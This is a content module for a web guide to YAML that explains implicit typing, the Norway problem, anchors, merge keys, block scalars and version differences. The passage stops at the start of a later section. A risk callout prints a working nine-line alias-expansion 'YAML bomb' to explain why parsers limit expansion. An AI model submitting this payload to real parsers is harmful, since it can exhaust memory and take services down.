/**
 * YAML format guide. Content module for /learn/yaml/.
 * Resolved against the YAML 1.2.2 specification, the YAML 1.1 type repository
 * and the Kubernetes, GitHub Actions, Ansible and Docker Compose docs.
 * Claims about our own tools appear only in the final section.
 */

import { Callout, CodeBlock, DataTable, Figure, H3, KeyTerms, P, Rich, Section } from '@/components/content'
import type { ArticleMeta } from '@/lib/content-types'

export const meta: ArticleMeta = {
  slug: 'yaml',
  path: '/learn/yaml/',
  title: 'YAML Complete Guide: 1.1 vs 1.2, Norway Problem & Fixes | FmtTools',
  description:
    'How YAML really works: implicit typing, the Norway problem, tabs, anchors, merge keys, block scalars, security history, and rules for YAML that survives review.',
  h1: 'YAML: The Complete Guide to the Format That Types Your Data',
  summary:
    'Why unquoted NO becomes false, why 1.10 becomes 1.1, and how indentation, anchors and the two versions of the spec turn into production incidents.',
  keywords: ['yaml guide', 'norway problem', 'yaml 1.2', 'yaml indentation', 'yaml anchors', 'block scalar'],
  published: '2026-11-02',
  updated: '2026-11-17',
  readingMinutes: 20,
  sections: [
    { id: 'what-yaml-is', label: 'What YAML is' },
    { id: 'layout-and-scalars', label: 'Layout and scalars' },
    { id: 'keys-anchors-and-merges', label: 'Keys, anchors, merges' },
    { id: 'implicit-typing', label: 'Implicit typing' },
    { id: 'yaml-11-vs-12', label: 'YAML 1.1 vs 1.2' },
    { id: 'dialects-and-toolchains', label: 'Dialects and streams' },
    { id: 'security-and-editing', label: 'Security and editing' },
    { id: 'how-our-yaml-tools-handle-these-cases', label: 'How our tools behave' },
  ],
  faqs: [
    {
      question: 'Should I convert YAML to JSON or JSON to YAML?',
      answer:
        'Convert in whichever direction leaves the artifact you actually have to defend. Read YAML as JSON when you need to know what a file means after resolution: the JSON is the resolved document, so type surprises and dropped documents become visible and diffable against the previous deployment. Write JSON as YAML when a person has to edit or commit the file, because a generator applies quoting and indentation where a human will not. Editing a file that already exists is the third case: convert only to inspect, then change the YAML in place.',
    },
    {
      question: 'My config loads in one tool and fails in another. Where do I look first?',
      answer:
        'Compare resolvers before you compare schemas. Take the smallest excerpt that reproduces it and ask what each side makes of a bare country code, a leading-zero mode, a clock time, a digit separator and a two-part version. Those five values separate the YAML 1.1 and 1.2 answers cleanly, so a disagreement between tools usually names itself. Only then check whether one side honours merge keys or reads a whole multi-document stream, because both fail by producing a different tree rather than an error.',
    },
    {
      question: 'How do I keep comments when I change one value programmatically?',
      answer:
        'Point the automation at the document model rather than at a parse-then-serialise pair: an in-place editor rewrites only the node you touched, so comments, quoting style and layout stay where they were. If your only tool is a load-and-dump pair, treat its output as a new file and review the resolved values rather than the text, because the rewrite is the change you are committing. Before trusting either one, run it over an unchanged file and diff output against input: a tool that is not a no-op on a file it never edited will not be honest about a file it did.',
    },
    {
      question: 'Do I have to care which YAML version my dependencies pull in?',
      answer:
        'Yes, and the way to care is pinning rather than reading documentation. The resolver belongs to the library and version in your lockfile or base image, so a transitive upgrade can change what your committed configuration means without changing a byte of it. Keep a five-value probe file in the repository as a test fixture, re-run it whenever the parser version moves, and fail the build if a resolved type changes. The same fixture is what exposes a second tool in the pipeline that disagrees with the first.',
    },
    {
      question: 'What should CI actually fail on for a YAML file?',
      answer:
        'Parse success is the weakest gate available, because almost every dangerous case in this guide parses cleanly and yields the wrong value. Two assertions cost one line each. First, assert that the resolved document count equals the number of objects you intend to ship, which turns a silently dropped document into a build failure. Second, diff the resolved output before and after a change rather than the text, and fail on a value whose type moved: a diff whose only visible edit is quoting is a type change, not whitespace.',
    },
  ],
  sources: [
    {
      label: 'YAML 1.2.2 specification (2021-10-01)',
      href: 'https://yaml.org/spec/1.2.2/',
      detail:
        'Structural productions, the tab rule in section 6.1 and separation spaces in 6.2, the block scalar header, chomping and folding rules, explicit keys, document markers and directives, and the chapter 10 core and JSON schema resolution tables.',
      accessed: '2026-11-12',
    },
    {
      label: 'Boolean type for YAML 1.1 (yaml.org type repository)',
      href: 'https://yaml.org/type/bool.html',
      detail: 'The 1.1 !!bool regular expression, including y/Y/n/N, yes/no, on/off and every capitalisation — the mechanism behind the Norway problem.',
      accessed: '2026-11-12',
    },
    {
      label: 'Integer type for YAML 1.1 (yaml.org type repository)',
      href: 'https://yaml.org/type/int.html',
      detail: 'The 1.1 integer forms: decimal, 0x hexadecimal, 0b binary, leading-zero octal, base-60 sexagesimal, and underscore digit separators.',
      accessed: '2026-11-12',
    },
    {
      label: 'Floating point type for YAML 1.1 (yaml.org type repository)',
      href: 'https://yaml.org/type/float.html',
      detail: 'The 1.1 float forms, including the fixed-point pattern that resolves 1.10 to 1.1, exponents such as 1.0e3, sexagesimal floats and -.inf/.NaN.',
      accessed: '2026-11-12',
    },
    {
      label: 'Merge Key Language-Independent Type for YAML 1.1',
      href: 'https://yaml.org/type/merge.html',
      detail:
        'Definition of the << merge key, the override rule for existing keys, sequence merging order, and its status as a 2005 working draft rather than part of the 1.2 core schema.',
      accessed: '2026-11-12',
    },
    {
      label: 'PyYAML documentation',
      href: 'https://pyyaml.org/wiki/PyYAMLDocumentation',
      detail:
        'The warning that yaml.load is unsafe for untrusted input in the same way as pickle, that it constructs arbitrary Python objects, and that yaml.safe_load is the recommended call; also the separate stream-level entry points yaml.load_all, yaml.safe_load_all and yaml.compose_all.',
      accessed: '2026-11-12',
    },
    {
      label: 'NVD record for CVE-2017-18342',
      href: 'https://nvd.nist.gov/vuln/detail/CVE-2017-18342',
      detail:
        'In PyYAML before 5.1 the yaml.load API could execute arbitrary code on untrusted data; load was deprecated in 5.1 and UnsafeLoader introduced for backward compatibility.',
      accessed: '2026-11-12',
    },
    {
      label: 'NVD record for CVE-2020-14343',
      href: 'https://nvd.nist.gov/vuln/detail/CVE-2020-14343',
      detail:
        'PyYAML before 5.4 remained exploitable through full_load and FullLoader by abusing the python/object/new constructor; the record describes this as an incomplete fix of CVE-2020-1747.',
      accessed: '2026-11-12',
    },
    {
      label: 'Kubernetes documentation: Understand Kubernetes objects',
      href: 'https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/',
      detail:
        'The API request body is JSON, manifests are conventionally YAML, and tools such as kubectl convert the manifest into JSON before the request — the reason YAML typing errors surface as type errors from the API.',
      accessed: '2026-11-12',
    },
    {
      label: 'GitHub Docs: Workflow syntax for GitHub Actions',
      href: 'https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions',
      detail:
        'Workflows are YAML files with a .yml or .yaml extension stored in .github/workflows, and the quoting requirement for values starting with *, [ or ! and for flow sequences containing brackets.',
      accessed: '2026-11-12',
    },
    {
      label: 'Ansible documentation: YAML syntax',
      href: 'https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html',
      detail:
        'Ansible gotchas list: colon-space as a mapping indicator, the reserved first characters, quoting literal yes and False, quoting version values that look like floats, lowercase true/false for yamllint compatibility, and the statement that PyYAML and libyaml implement YAML 1.1.',
      accessed: '2026-11-12',
    },
    {
      label: 'Docker Docs: Compose file reference, Fragments',
      href: 'https://docs.docker.com/reference/compose-file/fragments/',
      detail:
        'Compose anchors and aliases, the statement that Compose follows the rule outlined by the YAML merge type for <<, and the warning that merge applies only to mappings, not sequences.',
      accessed: '2026-11-12',
    },
    {
      label: 'go-yaml v3 README (gopkg.in/yaml.v3)',
      href: 'https://github.com/go-yaml/yaml/tree/v3',
      detail:
        'States that multi-document unmarshalling is not yet implemented, which is why a single Unmarshal call consumes only the first document of a stream and says nothing about the rest.',
      accessed: '2026-11-12',
    },
    {
      label: 'js-yaml README',
      href: 'https://github.com/nodeca/js-yaml',
      detail:
        'Describes loadAll as the entry point that understands multi-document sources, applying an iterator to each document if one is given or otherwise returning an array of documents.',
      accessed: '2026-11-12',
    },
    {
      label: 'yq (mikefarah) README',
      href: 'https://github.com/mikefarah/yq',
      detail:
        'Describes yq as a portable command-line processor for YAML, JSON, XML, CSV, TOML, HCL and properties files with jq-like path syntax such as .a.b[0].c and select, an -i flag that updates files in place, and an -e eval-all mode that operates across every document in a stream.',
      accessed: '2026-11-12',
    },
  ],
  related: [
    { path: '/format-converters/yaml-to-json/', name: 'YAML to JSON', blurb: 'The same document as JSON, for diffing and for feeding JSON-side tools.' },
    { path: '/format-converters/json-to-yaml/', name: 'JSON to YAML', blurb: 'Emit block-style YAML from a JSON document.' },
    { path: '/compare/yaml-vs-json/', name: 'YAML vs JSON', blurb: 'The same payload in both formats, on typing, size, comments and failure modes.' },
    { path: '/compare/yaml-vs-xml/', name: 'YAML vs XML', blurb: 'Two ways to describe a tree: indentation against markup, anchors against entities.' },
    { path: '/compare/yaml-vs-toml/', name: 'YAML vs TOML', blurb: 'TOML exists because of the problems described in this guide.' },
    { path: '/use-cases/config-conversion/', name: 'Config conversion tools', blurb: 'Manifests, pipelines and Spring profiles moved between formats.' },
  ],
  words: 3945,
  image: '/images/covers/learn-yaml.png',
  imageAlt: 'A flat vector diagram of nested indentation levels resolving into typed scalar blocks, with a table grid beneath.',
}

export default function Article() {
  return (
    <>
      <Section id="what-yaml-is" title="What YAML is: text, graph, values, stream" kicker="Start here">
        <P>
          YAML has three layers, and almost every incident in this guide happens at a seam between two of them. The bottom layer is the serialization: characters in which indentation, colons, dashes and quotation marks carry structure. The middle layer is the representation graph: nodes — scalar, sequence or mapping — each with a tag and content. The top layer is the native value your program receives, resolved from a node by the schema in force. Comments, anchor names, quoting style, the flow-versus-block choice and indentation depth live in the lower layers and exist nowhere in the value.
        </P>
        <P>
          So YAML does not merely store your data, it types it. In JSON a quoted value is a string and an unquoted one is a number or a boolean. In YAML the unquoted characters after a colon are a pattern matched against a resolver table, and sometimes <Rich text="it turns your ISO country code into `false`, your version string into `1.1` and your file mode `0755` into `493`" />. Nothing is reported: the file parses, the config loads, and the value is a different type from the one you wrote.
        </P>
        <P>
          Two structural facts drive everything else. The unit at the top of a file is a stream, not a document: the grammar begins with a stream of zero or more documents, so a single-document file is the ordinary case of that rule. And YAML is a language, not a schema — no field names, no required keys, no validation vocabulary. Every project layers its own schema on top, and each has to cope with whatever type the resolver already chose: a manifest fails with <Rich text="`cannot unmarshal string into Go value of type int64`" /> when you wrote a plausible-looking number with a leading plus sign.
        </P>
        <CodeBlock
          title="one stream, three layers"
          language="yaml"
          code={`# comment: belongs to the text layer
release:
  version: 1.10        # resolver decides this is the number 1.1
  channel: "1.10"      # quotes force a string
  countries: [NO, SE]  # 1.1 -> [false, "SE"]; 1.2 core -> ["NO", "SE"]`}
          caption="Three characters of syntax produce three different values. Everything in this guide is an explanation of the arrow between the text and the value."
        />
        <KeyTerms
          items={[
            { term: 'node', definition: 'A single unit in the representation graph: a scalar, a sequence or a mapping, each with a tag and content.' },
            { term: 'plain scalar', definition: 'An unquoted scalar. The only style whose type is decided implicitly by the schema in use.' },
            { term: 'tag', definition: 'The label that tells a processor how to interpret content, for example tag:yaml.org,2002:int, written !!int.' },
            { term: 'schema', definition: 'A set of tags plus a resolution table for plain scalars. 1.2 recommends failsafe, JSON and core.' },
            { term: 'resolver', definition: 'The rule set that matches a plain scalar against patterns and picks a tag without any explicit annotation.' },
            { term: 'chomping', definition: 'How a block scalar treats final line breaks and trailing empty lines: strip, clip or keep.' },
          ]}
        />
        <H3>Documents, markers and directives</H3>
        <P>
          <Rich text="`---`" /> begins a document and <Rich text="`...`" /> ends one without starting another. A bare single document needs no marker; a directive, or an explicit end marker, forces an explicit start. Ansible notes the same pair as a general property of the language — files may optionally begin with <Rich text="`---`" /> and end with <Rich text="`...`" />.
        </P>
        <P>
          Multi-document files are the storage format of at least two ecosystems: Kubernetes accepts several manifests in one file separated by the start marker, and Helm and kustomize emit that shape rather than one file per object.
        </P>
        <DataTable
          caption="Directive behaviour from the 1.2.2 structural productions"
          head={['Directive', 'Purpose', 'Required processor behaviour']}
          rows={[
            ['%YAML 1.2', 'declares the language version', 'More than one per document is an error, even if they agree. A higher minor version is a warning; a higher major version is rejected. A 1.2 processor must also accept an explicit 1.1 directive.'],
            ['%TAG !edi tag:...', 'binds a handle to a tag prefix', 'The standard handles !! and ! are pre-defined and may be overridden by a directive for the document.'],
            ['--- / ...', 'document start and end', 'A document that carries directives must have a start marker.'],
          ]}
          foot="BOM: a UTF-8 byte-order mark is permitted before the first character of a stream and must not appear elsewhere; parsers differ loudly on it, so check your tool if a file that looks identical errors at line 1, column 1."
        />
        <CodeBlock
          title="a three-document stream"
          language="yaml"
          code={`---
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  mode: "1.10"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app
---
# third document, empty except a comment: legal
`}
          caption="Three documents. A parser reports documents: 3 or 2 depending on whether it counts the empty final one — a good example of a detail you should not let a tool guess for you."
        />
        <Callout tone="spec" title="What the standard says today">
          <P>
            YAML 1.2.2, published 2021-10-01, is the current specification; its status section calls it informational and reports no normative changes from 1.2. Its introduction states that 1.2, published in 2009, was driven by making YAML a strict superset of JSON and removed many of the problematic implicit typing recommendations. JSON is a subset of 1.2 in syntax; semantically the two still disagree on duplicate object keys, which JSON allows and YAML forbids.
          </P>
        </Callout>
        <Figure
          src="/images/learn-yaml.svg"
          alt="Flow diagram: a plain YAML scalar is matched against a schema resolver table and can become a boolean, an integer, a float, a timestamp or a string, with the YAML 1.1 and 1.2 columns disagreeing on NO, 0755, 12:30 and 2024-01-15."
          caption="The same four characters, two different answers. The resolver column you get depends on the library your build happens to pull in."
          width={1200}
          height={540}
        />
      </Section>

      <Section id="layout-and-scalars" title="How text becomes structure: layout and scalars">
        <P>
          In block styles, structure is indentation, which the specification defines as zero or more space characters at the start of a line: <Rich text="`s-indent(n)` is n spaces, nothing else" />. The sentence that follows is the one to memorise — to maintain portability, tab characters must not be used in indentation. Tabs are legal elsewhere: section 6.2 allows any whitespace, including tabs, as separation space between tokens inside a line, and tabs inside quoted or block scalar content are content. But a tab doing structural work is a syntax error in every mainstream parser.
        </P>
        <P>
          The specification also says the amount of indentation is a presentation detail and must not be used to convey content information: a parser may not decide your data is different because you used four spaces instead of two. It does not mean the file can be ragged — within one document all members of a block sequence start at the same column with a dash and a space, and a block mapping key sits at the indentation level of its parent mapping. Two visual styles are permitted for a sequence nested in a mapping, the dash at the key&apos;s column, which Ansible and Kubernetes style guides show, or indented beneath it, and both are the same data.
        </P>
        <CodeBlock
          title="both of these are the same document"
          language="yaml"
          code={`fruits:
- Apple
- Mango

fruits:
  - Apple
  - Mango

# and this is neither: one mapping, broken content
broken:
- name: one
 job: developer`}
          caption="The last block fails: a mapping key inside a sequence item must be indented past the dash, and one space of misalignment is enough to make the parser read job as a key of the parent map or reject the line outright."
        />
        <H3>Folding, because you will write it</H3>
        <P>
          Folding turns a soft-wrapped line back into one, for plain and quoted scalars and for the folded block style. The rule is exact: a line break followed by an empty line is trimmed — the first break discarded, the remaining breaks retained as content; otherwise a line break becomes a single space. Block styles add one exception, around lines with leading whitespace, which is why a more-indented line inside a folded block keeps its newlines.
        </P>
        <CodeBlock
          title="folding rules, demonstrated"
          language="yaml"
          code={`one: >
  two words
  on two lines

three: >
  a paragraph

  after an empty line
  four: still folded

five: >
  keeps its breaks
    * bullet
    * list
  and resumes folding`}
          caption="Resolved values: one is the single line two words on two lines; three ends with one newline because of clip chomping; five keeps the two more-indented lines exactly as written."
        />
        <H3>The four scalar styles</H3>
        <P>
          Every leaf is written in one of four styles, and the style decides which characters are legal and how line breaks behave: plain has no delimiters, single-quoted treats two adjacent quotes as one escaped quote, double-quoted interprets escape sequences, and the block styles use a header line plus indented content. Only one of the four matters for typing — plain is the only style subject to implicit resolution, so quote a scalar and its tag is <Rich text="`!!str`" /> before any resolver runs.
        </P>
        <P>
          A block scalar header is the literal or folded indicator, then optionally an indentation indicator, a digit from 1 to 9, and a chomping indicator, in either order, then optional trailing spaces, a comment and a line break. The indentation indicator exists for content that begins with a space or a tab, because block indentation is detected from the first non-empty line.
        </P>
        <DataTable
          caption="Chomping, from the 1.2.2 block chomping indicator section"
          head={['Indicator', 'Name', 'Final line break', 'Trailing empty lines', 'Typical use']}
          rows={[
            ['|-', 'strip', 'removed', 'removed', 'a message or script with no trailing newline'],
            ['|', 'clip (default)', 'kept as one newline', 'removed', 'multi-line text that should end in exactly one newline'],
            ['|+', 'keep', 'kept', 'all kept, and not subject to folding', 'file content where the blank lines are data'],
          ]}
          foot="With the folded indicator the same three apply, but every non-empty line break inside the body is also folded into a space, except around more-indented lines."
        />
        <CodeBlock
          title="literal, folded and the difference in the values"
          language="yaml"
          code={`script: |
  set -euo pipefail
  echo "hi"

message: >
  folded text continues
  on the next line

keep: |+
  trailing

  lines retained

strip: |-
  no final newline

literal2: |2
    this block declares its indentation as 2 spaces
  so the leading two spaces are content`}
          caption="Five scalars, five different strings. script ends with one newline, message ends with one newline after folding, keep ends with three, strip ends with none, and literal2 begins with two spaces."
        />
        <Callout tone="spec" title="Escapes only exist in double quotes">
          <P>
            Escape sequences are interpreted in double-quoted scalars and nowhere else: in single-quoted and plain scalars the backslash has no special meaning. The double-quoted set is a superset of C escapes, including <Rich text="`\t`, `\n`, `\u` and `\x` forms" />. That asymmetry bites when someone migrates a JSON file into YAML by deleting the quotes: <Rich text="`C:\new\dir`" /> stops being a literal path, and a Windows path ending in a backslash before the closing quote stops parsing entirely. Ansible calls the same class of problem out with an escaped single quote inside a double-quoted string.
          </P>
        </Callout>
      </Section>

      <Section id="keys-anchors-and-merges" title="Keys, duplicates, anchors and merges">
        <P>
          A block mapping entry is a key, a colon followed by whitespace or an end of line, and a value; a block sequence entry is a dash followed by whitespace. A surprising number of bugs are just a missing space after the colon: <Rich text="`url:http://example.com`" /> is not a key-value pair, because the colon only ends a key when a space or a line break follows. Ansible documents this as its first gotcha. The same page lists the characters that may not begin a plain scalar — brackets, braces, the block indicators, an asterisk, an ampersand, an exclamation mark, a percent sign, a hash, a backtick, an at sign and a comma — and notes that some are allowed when a non-space follows but that implementations differ, so quoting beats reasoning about it.
        </P>
        <P>
          Key uniqueness is a requirement of the data model, not a style preference: the specification defines a mapping as having unique keys when no two keys are equal, and equality is decided by tag plus canonical content. That last part matters. Under a resolver that recognises both octal and hexadecimal integers, <Rich text="`0o13`" /> and <Rich text="`0xB`" /> in one mapping are both the integer eleven, so they are the same key and a processor that understands integer formats has to flag it.
        </P>
        <CodeBlock
          title="duplicate keys that do not look like duplicates"
          language="yaml"
          code={`a: 1
b: 2
a: 3            # duplicate: last one wins in most native maps

octal:
  0o13: x       # 1.2 core: integer 11
  0xB: y        # 1.2 core: integer 11 -> same key as 0o13
  013: z        # 1.1 also reads this as octal 11`}
          caption="Whether the third key collides with the other two depends entirely on which resolver is in force — one reason to run duplicate-key detection against the schema you actually ship on."
        />
        <P>
          The indicator <Rich text="`?`" /> at the start of a line introduces an explicit key, and <Rich text="`:`" /> alone on a line at the same indentation introduces the value. This is how you write a mapping whose key is a sequence, a map or a multi-line block scalar, and how you write an empty key or an empty value deliberately.
        </P>
        <CodeBlock
          title="explicit keys and complex keys"
          language="yaml"
          code={`---
? [1, 2]
: north

? |
  multi
  line key
: value

? explicit key
# Empty value

? : value-with-empty-key`}
          caption="Four legal entries: a sequence key, a block-scalar key, a key with a null value, and an empty key. All of them parse; none of them survive a JSON round trip, because JSON object keys must be strings."
        />
        <DataTable
          caption="Where each construct lands when YAML becomes JSON"
          head={['YAML construct', '1.2 core value', 'JSON outcome', 'Risk']}
          rows={[
            ['explicit key over a sequence', 'map with a sequence key', 'not representable; key must be stringified', 'high'],
            ['duplicate keys, one of them an alias', 'error at compose time', 'n/a — parsing stops', 'low, if the parser checks'],
            ['empty key', 'map with an empty-string key', 'works', 'low'],
            ['null value from a missing value', 'null', 'null', 'low'],
            ['non-string key such as 1:', 'integer key', 'converted to the string 1', 'medium'],
            ['binary tag on a scalar', 'decoded bytes', 'base64 string, silently', 'medium'],
          ]}
          foot="Any converter that claims lossless YAML to JSON conversion is choosing one of these outcomes for you without asking. The same is true of a bare date or a plain yes used as a key: under 1.1 it becomes a typed key, and is then stringified differently or dropped."
        />
        <H3>Anchors, aliases and the graph model</H3>
        <P>
          An anchor names a node at its first occurrence and an alias refers back to that node later. The representation model is a graph rather than a tree, so an aliased node is the same node, not a copy. Anchors need not be unique within a serialisation, and an alias refers to the most recent event carrying that anchor. Anchors are discarded once the graph is composed — whether your tool preserves them is a property of the tool, not the format — and they are scoped to one document, so never alias a node across documents in a stream.
        </P>
        <CodeBlock
          title="aliases, and what they are not"
          language="yaml"
          code={`base: &defaults
  retries: 3
  region: eu-north-1

job-a:
  <<: *defaults
  retries: 5

job-b: *defaults        # the same map, not a copy
job-c: *defaults

matrix:
  - &row {a: 1}
  - *row                # two entries pointing at one map`}
          caption="job-a merges the defaults and overrides retries. job-b and job-c share one map object in languages that build native references; job-a's retries is 5 because keys already present in the target mapping are not overwritten."
        />
        <P>
          The merge key <Rich text="`&lt;&lt;`" /> is the <Rich text="`tag:yaml.org,2002:merge`" /> scalar type defined in a 2005 working draft, not a 1.2 feature. Its rules: if the value is a single mapping, each of its key-value pairs is inserted into the current mapping unless the key already exists; if the value is a sequence, each mapping in it is merged in order, and keys in earlier entries override keys in later ones. Nothing in the 1.2 recommended schemas defines it, so a core-only parser leaves a literal double-angle-bracket key in your map, while a parser that supports it silently collapses two levels of structure into one. Docker Compose is the vendor that documents and depends on this behaviour: its fragments reference says Compose follows the rule outlined by the YAML merge type, and adds the caveat that merging applies to mappings and not sequences — so an <Rich text="`environment:`" /> written as a list of <Rich text="`KEY=VALUE`" /> strings cannot be merged.
        </P>
        <Callout tone="risk" title="The alias size problem">
          <CodeBlock
            title="a YAML bomb in nine lines"
            language="yaml"
            code={`a: &a ["x","x","x","x","x","x","x","x","x"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]`}
            caption="Under ten lines of text. Nine aliases per level, nine levels: a processor that expands references into native containers builds 9 to the power of 9 nodes, which is 387,420,489 lists, and gigabytes of memory."
          />
          <P>
            This is the same shape as the XML entity-expansion attack, and it is why parsers that accept untrusted YAML cap node counts, alias expansion or total depth: a representation graph with shared nodes is cheap, a native object tree is not. If your service parses YAML uploaded by users it needs a documented limit; YAML from your own repository needs review, not a parser flag. Because anchors and aliases vanish at composition, two files differing only in anchor names resolve to identical data, so a review tool that renders the resolved tree cannot tell you whether the anchor moved.
          </P>
        </Callout>
      </Section>

      <Section id="implicit-typing" title="Implicit typing: exactly what YAML guesses">
        <P>
          Chapter 10 of the 1.2 specification recommends three schemas, and the differences between them are the differences between ecosystems. A schema is a tag set plus a resolution table; tag resolution is what maps a plain scalar to a type — the value is tested against the patterns in order, the first match wins, and the default rule gives <Rich text="`!!str`" />. A plain scalar matching one of the patterns below is not a string.
        </P>
        <DataTable
          caption="The three recommended YAML 1.2 schemas"
          head={['Schema', 'Types resolved for plain scalars', 'Who uses it', 'Note']}
          rows={[
            ['Failsafe', 'map, seq, str only', 'language-neutral exchange, any tool that must not guess', 'Everything is a string until you tag it explicitly.'],
            ['JSON', 'null, bool, int, float, plus map, seq, str', 'a document that must mean exactly what the JSON says', 'Integers and floats are restricted to the JSON spellings: no 0x, no .inf, no leading plus.'],
            ['Core', 'the same tags as the JSON schema', 'the recommended default for new tools', 'Only the spelling widens: 0x3A, 0o7, ~, Null, .inf and .nan are accepted. No timestamp type is added.'],
          ]}
          foot="None of the three precludes explicit tags: a processor may always honour !!str or a local tag such as !ruby/object:Set, which is what chapter 10.4 says about language-specific types."
        />
        <DataTable
          caption="Core schema tag resolution, transcribed from YAML 1.2.2 chapter 10"
          head={['Plain scalar pattern', 'Resolves to', 'Examples that match', 'Examples that do not']}
          rows={[
            ['null | Null | NULL | ~', '!!null', 'null, NULL, ~', '"" (an empty quoted string is a string)'],
            ['empty', '!!null', 'a value with nothing after the colon', 'a value that is only spaces'],
            ['true | True | TRUE | false | False | FALSE', '!!bool', 'true, FALSE', 'yes, on, Y, NO (1.1 only)'],
            ['[-+]? [0-9]+ (base 10)', '!!int', '0, -19, +42', '1_000 (1.1 only), 017 (see below)'],
            ['0o [0-7]+ (base 8)', '!!int', '0o7, -0o17', '07 (1.1 octal), 08 (never valid)'],
            ['0x [0-9a-fA-F]+ (base 16)', '!!int', '0x3A, -0xb', '3A (a string)'],
            ['float: dot and digits, optional exponent', '!!float', '0., -0.0, .5, +12e03, -2E+05', '1, 1. (some parsers accept, some do not)'],
            ['[-+]? ( .inf | .Inf | .INF )', '!!float', '.inf, -.Inf, +.INF', 'Infinity, inf'],
            ['.nan | .NaN | .NAN', '!!float', '.nan, .NAN', 'NaN, null'],
            ['nothing for dates', '!!str by default', '2001-12-14, 2001-12-14t21:59:43.10-05:00', 'they match no core pattern, so they are strings'],
            ['*', '!!str', 'everything else', 'n/a'],
          ]}
          foot={'Example 10.9 from the specification is the canonical test vector: null: null; Also a null: (empty); Not a null: ""; Integers: [0, 0o7, 0x3A, -19]; Floats: [0., -0.0, .5, +12e03, -2E+05].'}
        />
        <Callout tone="spec" title="Explicit typing always beats the resolver">
          <P>
            Prefix a scalar with a tag and the resolver is not consulted: <Rich text="`!!str 2002-04-28`" /> is the string <Rich text="`2002-04-28`" /> in every schema, and the specification example for explicit tags uses exactly that case. Quoting is the same mechanism from the other side — a quoted scalar never reaches the resolver — so tagging and quoting are interchangeable defences.
          </P>
        </Callout>
        <H3>The Norway problem</H3>
        <P>
          In YAML 1.1 the boolean type is defined by this regular expression: <Rich text="`y|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF`" />. Twenty-four spellings of two values, chosen for human readability, with the type repository documenting the intent that booleans be formatted as English words and may be abbreviated to a single character. The 1.2 core schema keeps only the true and false spellings and drops the rest to strings. Put either resolver beside ISO 3166-1 alpha-2 country codes, where <Rich text="`NO`" /> is Norway and <Rich text="`SE`" /> is Sweden, and beside the Canadian province abbreviation <Rich text="`ON`" />, and you have the bug: what an unquoted list means depends on an edition its author never chose.
        </P>
        <CodeBlock
          title="the incident, in miniature"
          language="yaml"
          code={`locales:
  - en
  - NO          # 1.1: false   1.2 core: "NO"
  - SE          # 1.1: "SE"    1.2 core: "SE"

notifications:
  email: yes    # 1.1: true    1.2 core: "yes"
  sms: off      # 1.1: false   1.2 core: "off"

flags:
  - {y: 2024, n: 2025}`}
          caption="The list becomes [en, false, SE], and a strict schema that expects strings reports a type error at element 1 — the error message will not mention Norway."
        />
        <P>
          The reported shape of this failure is not a crash. The widely told 2011 story is a database snapshot job that deleted production data because a config file listed Norway: a deployment pipeline filtering environments by country code received a list containing the boolean false, matched nothing, and ran the operation against everything. The mechanism is the resolver table above; the postmortem is folklore, the bug class is not, and downstream code often coerces a boolean without complaining. Ansible gives the fix directly: quote literal <Rich text="`yes`" /> and other boolean-looking values, and write lowercase <Rich text="`true`" /> or <Rich text="`false`" /> where you do mean booleans, because that is what a default yamllint configuration accepts.
        </P>
        <P>
          Under both editions an empty plain scalar resolves to null, including a key with nothing after the colon, so <Rich text="`password:`" /> is not the empty string but null — a security bug rather than a formatting bug in any application that treats a null credential as a blank one.
        </P>
        <H3>Versions, octal and base 60</H3>
        <P>
          Three families of values look like numbers to a reader and are not numbers in the schema. Version strings first: <Rich text="`1.10`" /> matches the float pattern in both editions and resolves to 1.1, so the trailing zero disappears, while <Rich text="`1.2.3`" /> matches nothing and stays a string — which is why two-part versions break and three-part versions do not, and why Ansible says to quote version values that look like floats. File modes second: the 1.1 integer forms are decimal, hexadecimal, binary, a leading <Rich text="`0`" /> to signal octal and base 60, with underscores inside the digits ignored, and the 1.2 core schema replaces the leading-zero form with an explicit <Rich text="`0o`" /> prefix, so <Rich text="`0755`" /> is 493 under 1.1 while 1.2 implementations split on whether a leading zero is valid at all. Times third: in 1.1 a digit followed by colon-separated pairs below sixty is an integer in base 60, so <Rich text="`12:30`" /> is 750 and <Rich text="`3:25:45`" /> is 12345, and floats take the same shape, so <Rich text="`20:30.15`" /> is 1230.15; the core schema has no sexagesimal forms at all, so the identical text is a string there.
        </P>
        <CodeBlock
          title="versions and the values they become"
          language="yaml"
          code={`bad_a: 1.10        # float 1.1
bad_b: 1.0e3       # float 1000
fine_c: 1.2.3      # string, because two dots match nothing
fixed_a: "1.10"    # string
release: !!str 1.10 # explicit tag, same result as quoting`}
          caption="Write versions as strings from the start: a version is an identifier with dots in it, never a number."
        />
        <DataTable
          caption="The numeric traps, and the fix in each case"
          head={['You wrote', 'YAML 1.1', 'YAML 1.2 core', 'Fix']}
          rows={[
            ['1.10', 'float 1.1', 'float 1.1', '"1.10"'],
            ['0755', 'int 493 (octal)', 'string or rejected, varies', '"0755", or 0o755 for 1.2'],
            ['12:30', 'int 750 (base 60)', 'string "12:30"', 'quote it in both'],
            ['1_000', 'int 1000', 'string "1_000"', 'write 1000 or quote'],
            ['+12', 'int 12', 'int 12', 'fine, but not in JSON'],
            ['0b1101', 'int 13', 'string "0b1101"', 'quote it'],
            ['.nan', 'float NaN', 'float NaN', 'beware comparisons'],
          ]}
          foot="The +12 row is worth a note: YAML accepts a leading plus sign in integers and floats, which JSON does not, so a hand-written YAML number can be valid YAML and invalid JSON at the same time. Treat every unquoted value in a configuration file as a claim that you want the resolver to guess."
        />
      </Section>

      <Section id="yaml-11-vs-12" title="YAML 1.1 against 1.2, one row at a time">
        <P>
